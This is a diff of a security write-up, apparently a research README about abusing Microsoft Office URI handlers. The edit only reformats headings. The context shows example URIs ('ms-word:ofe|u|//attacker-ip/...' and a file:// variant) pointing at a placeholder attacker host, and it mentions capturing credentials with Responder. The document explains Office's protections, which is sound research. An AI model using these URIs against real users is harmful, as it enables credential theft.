@@ -11,14 +11,14 @@ Microsoft understands that these URI's could be used in nefarious ways, and they
 ## PROTECTIONS
 Below are two examples of "unsafe" methods that Microsoft Office tries to prevent.
 
-**UNC PATH**
+### UNC PATH
 When trying to access an Office URI link containing a UNC path to a file at an untrusted location, Microsoft Word blocks the file from opening and displays this error message:
 
 `ms-word:ofe|u|//attacker-ip/document.docx`
 
 ![images/1.png](images/1.png)
 
-**The file:// URI**
+### The file:// URI
 When using the file:// URI, Word *will* open, but the user gets prompted for warnings, and if Responder is running, they will be asked to enter their credentials. For most users, this would be very suspicious behavior:
 
 `ms-word:ofe|u|file://attacker-ip/document.docx`
